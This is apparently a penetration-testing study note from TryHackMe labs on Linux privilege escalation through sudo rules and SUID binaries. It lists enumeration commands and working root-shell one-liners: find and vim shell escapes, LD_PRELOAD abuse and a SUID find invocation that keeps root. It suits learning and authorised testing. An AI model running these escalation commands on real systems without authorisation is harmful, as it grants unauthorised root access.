---
tags: [privesc]
tools: [linpeas]
ports: []
os: [linux]
phase: [privesc]
---
# Privesc - Linux sudo and SUID

**TL;DR:** Both abuse a binary running with root's rights. **sudo**: `sudo -l` shows what you can run as root → check GTFOBins for a shell escape. **SUID**: a root-owned binary with the setuid bit runs as root for anyone → same GTFOBins lookup. GTFOBins is the answer key for both.

from: TryHackMe Linux PrivEsc / PrivEsc Arena — verified vs GTFOBins

## Sudo

```bash
sudo -l                      # e.g. (root) NOPASSWD: /usr/bin/find
# Look the binary up on GTFOBins under "Sudo". Example:
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
# LD_PRELOAD / LD_LIBRARY_PATH if env_keep lets it through
sudo PYTHONPATH=... or LD_PRELOAD=/tmp/x.so <allowed-cmd>
```

Also check sudo **version** for CVEs (e.g. Baron Samedit `sudo --version`).

## SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
# Non-standard binary in the list -> GTFOBins "SUID" section. Example:
./find . -exec /bin/sh -p \; -quit         # -p keeps euid=root
```

## Gotchas

- Use `-p` with shells from SUID binaries, or the shell drops privileges.
- GTFOBins separates **Sudo**, **SUID** and **Capabilities** sections — use the right one.

## Related

- [[Privesc - Linux enumeration]], [[Privesc - Linux cron and misc]]
